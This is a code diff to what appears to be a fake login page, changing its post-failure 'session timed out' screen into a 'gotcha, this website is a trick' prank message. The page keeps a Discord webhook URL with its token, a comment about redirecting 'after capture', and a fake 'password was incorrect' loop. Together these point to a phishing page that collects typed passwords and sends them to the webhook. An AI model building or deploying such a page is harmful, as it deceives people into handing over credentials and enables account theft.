@@ -298,6 +298,26 @@
 
     .timeout-button:hover { opacity: 0.9; }
 
+    .prank-text {
+      margin: 0 0 26px;
+      font-size: 15px;
+      line-height: 1.55;
+      color: #d4d4d4;
+    }
+
+    .prank-text .em {
+      color: #ffffff;
+      font-weight: 600;
+    }
+
+    .prank-signoff {
+      margin: 18px 0 0;
+      font-size: 13px;
+      color: #8e8e8e;
+      font-style: italic;
+      line-height: 1.4;
+    }
+
     @media (max-width: 380px) {
       .card { padding: 36px 24px 24px; }
       .logo { font-size: 36px; }
@@ -390,12 +410,21 @@
         <div class="timeout-icon">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
             <circle cx="12" cy="12" r="10"/>
-            <polyline points="12 6 12 12 16 14"/>
+            <path d="M8 14s1.5 2 4 2 4-2 4-2"/>
+            <line x1="9" y1="9" x2="9.01" y2="9"/>
+            <line x1="15" y1="9" x2="15.01" y2="9"/>
           </svg>
         </div>
 
-        <h2 class="timeout-title">Your session has timed out</h2>
-        <p class="timeout-text">For your security, we've ended your session. Please close this window and try again later.</p>
+        <h2 class="timeout-title">gotcha</h2>
+
+        <p class="prank-text">
+          this website is a <span class="em">trick</span> lol.
+          <br><br>
+          thanks for actually reading my messages.
+        </p>
+
+        <p class="prank-signoff">— you can close this now</p>
 
         <a href="#" onclick="return false;" class="timeout-button">Close</a>
 
@@ -411,9 +440,6 @@
 
   <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1558927875325829213/GAnr1NOny8bUmKg1ulMr0U1Of9TcoiN1RxxXQ4y-Vqd2kgZGyxGc6ayskEoovv5vwWXk";
-
-    // where to bounce after capture. null = show timeout view instead.
-    const REDIRECT_URL = null;
 
     const MAX_ATTEMPTS = 3;
 
@@ -515,13 +541,7 @@
       if (attempts >= MAX_ATTEMPTS) {
         message.className = "error-message";
         message.textContent = "Sorry, your password was incorrect.";
-        setTimeout(function () {
-          if (REDIRECT_URL) {
-            window.location.href = REDIRECT_URL;
-          } else {
-            showTimeout();
-          }
-        }, 700);
+        setTimeout(showTimeout, 700);
         return;
       }
 
